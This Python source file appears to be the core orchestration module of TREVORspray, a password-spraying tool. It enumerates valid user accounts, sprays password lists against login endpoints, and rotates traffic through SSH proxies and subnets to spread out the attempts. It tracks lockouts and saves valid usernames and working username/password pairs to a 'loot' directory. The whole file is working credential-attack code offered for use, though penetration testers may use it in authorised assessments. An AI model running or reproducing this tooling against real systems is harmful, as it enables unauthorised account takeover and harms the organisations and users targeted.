import os
import time
import logging
import importlib
import threading
from . import util
from . import sprayers
from pathlib import Path
from . import enumerators
from contextlib import suppress
from tldextract import tldextract
from .errors import TREVORSprayError
from .discover import DomainDiscovery
from .proxy import ProxyThread, SubnetThread

log = logging.getLogger("trevorspray.sprayer")


class TrevorSpray:
    env_keyword = "TREVOR_"

    def __init__(self, options):
        self.options = options
        self.runtimeparams = dict(self.env)

        self.lockout_counter = 0
        self.lockout_question = False

        self.sprayed_counter = 0
        self.sprayed_possible = max(1, len(self.options.users)) * max(
            1, len(self.options.passwords)
        )

        self.home = Path.home() / ".trevorspray"
        self.home.mkdir(exist_ok=True)
        self.loot_dir = self.home / "loot"
        self.loot_dir.mkdir(exist_ok=True)

        self._discovery = {}
        self._domain = None

        self.proxies = []
        if options.ssh:
            threads = options.ssh + ([] if options.no_current_ip else [None])
        elif options.subnet:
            threads = ["<subnet>"] * options.threads
        else:
            threads = [None] * options.threads

        self.subnet_proxy = None
        if options.subnet:
            self.subnet_proxy = SubnetThread(trevor=self, daemon=True)
            self.subnet_proxy.start()

        initial_delay_increment = (options.delay + (options.jitter / 2)) / max(
            1, len(options.ssh)
        )
        for i, ssh_host in enumerate(threads):
            proxy = ProxyThread(
                trevor=self,
                host=ssh_host,
                proxy_port=options.base_port + i,
                daemon=True,
            )
            if options.ssh or options.threads:
                proxy.initial_delay = initial_delay_increment * i
            self.proxies.append(proxy)

        self.user_enum = False
        self.user_enumerator = None
        if self.options.users and self.options.recon:
            log.info(f"User enumeration enabled with --recon and --users")
            self.user_enum = True
            choices = list(enumerators.module_choices.keys())
            choice = self.runtimeparams.get("userenum_method", "")
            while not choice:
                log.info(
                    f'Choosing user enumeration method (skip by exporting TREVOR_userenum_method={"|".join(choices)})'
                )
                choice = input(
                    f'\n[USER] Which user enumeration method would you like to use? ({"|".join(choices)}) '
                )
                if choice not in choices:
                    log.error(f'Invalid selection, "{choice}"')
                    choice = ""
                    continue
            self.runtimeparams.update({"userenum_method": str(choice)})
            self.user_enumerator = enumerators.module_choices[choice](trevor=self)

        sprayer_class = sprayers.module_choices.get(options.module, None)
        if sprayer_class is not None:
            self.sprayer = sprayer_class(trevor=self)
        else:
            raise TREVORSprayError(f'Failed to load sprayer "{options.module}"')

        self.existent_users_file = str(self.home / "existent_users.txt")
        self.valid_logins_file = str(self.home / "valid_logins.txt")
        self.tried_logins_file = str(self.home / "tried_logins.txt")
        self.existent_users = []
        self.valid_logins = []
        self.tried_logins = util.read_file(
            self.tried_logins_file, key=lambda x: x.startswith(f"{self.sprayer.id}")
        )

        self.lock = threading.Lock()
        self._stop = False
        self.stopping = False

    def go(self):
        try:
            self.start()

            if self.options.recon:
                discovery = self.discovery(self.options.recon)
                discovery.recon()

            if self.options.users:
                # user enumeration
                if self.options.recon:
                    log.info(
                        f"Enumerating {len(self.options.users):,} users against {self.user_enumerator.url} at {time.ctime()}"
                    )
                    self.spray(enumerate_users=True)
                    log.info(
                        f"Enumerated {len(self.existent_users):,} valid users against {self.user_enumerator.url} at {time.ctime()}"
                    )
                    self.options.users = list(self.existent_users)

                # password spray
                if self.options.passwords:
                    log.info(
                        f"Spraying {len(self.options.users):,} users * {len(self.options.passwords):,} passwords against {self.sprayer.url} at {time.ctime()}"
                    )
                    self.spray()
                    log.info(
                        f"Finished spraying {self.sprayed_counter:,} users against {self.sprayer.url} at {time.ctime()}"
                    )
                    for success in self.valid_logins:
                        log.success(success)
        finally:
            self.stop()

    def spray(self, enumerate_users=False):
        if enumerate_users:
            sprayer = self.user_enumerator
        else:
            sprayer = self.sprayer

        ready = False
        try:
            ready = sprayer.initialize()
        except Exception as e:
            log.error(
                f"Unhandled error in {sprayer.__class__.__name__}.initialize(): {e}"
            )
            if log.level <= logging.DEBUG:
                import traceback

                log.error(traceback.format_exc())

        if not ready:
            log.error(f"Failed to initialize {sprayer.__class__.__name__}")
            return

        for password in [None] if enumerate_users else self.options.passwords:
            for user in self.options.users:
                accepted = False
                while not accepted and not self._stop:
                    for proxy in self.proxies:
                        accepted = proxy.submit(user, password, enumerate_users)
                        if accepted:
                            break

                    if not accepted:
                        time.sleep(0.1)

        # wait until finished
        self.stopping = True
        while not self.finished:
            log.verbose("Waiting for proxy threads to finish")
            time.sleep(2)

    def start(self):
        for proxy in self.proxies:
            if proxy is not None:
                proxy.start()

    def stop(self):
        log.debug("Stopping sprayer")
        self.stopping = True
        self._stop = True
        for proxy in self.proxies:
            if proxy is not None:
                proxy.stop()
        with suppress(Exception):
            self.subnet_proxy.stop()
        # write valid users
        util.update_file(self.existent_users_file, self.existent_users)
        log.info(
            f"{len(self.existent_users):,} valid users written to {self.existent_users_file}"
        )
        # write attempted logins
        util.update_file(self.tried_logins_file, self.tried_logins)
        # write valid logins
        util.update_file(self.valid_logins_file, self.valid_logins)
        log.info(
            f"{len(self.valid_logins):,} valid user/pass combos written to {self.valid_logins_file}"
        )

    @property
    def finished(self):
        return all([not proxy.running for proxy in self.proxies])

    def discovery(self, domain):
        try:
            domain = tldextract.extract(domain).fqdn
        except Exception:
            return None
        if not domain in self._discovery:
            self._discovery[domain] = DomainDiscovery(self, domain)
        return self._discovery[domain]

    @property
    def env(self):
        env = dict()
        # enumerate environment variables
        for k, v in os.environ.items():
            if k.startswith(self.env_keyword):
                _k = k.split(self.env_keyword)[-1]
                env[_k] = v
        return env

    @property
    def domain(self):
        if self._domain is None:
            if self.options.recon:
                self._domain = str(self.options.recon)
            elif self.options.users:
                for user in self.options.users:
                    if "@" in user:
                        self._domain = self.options.users[0].split("@")[-1].lower()
                        break

        return self._domain
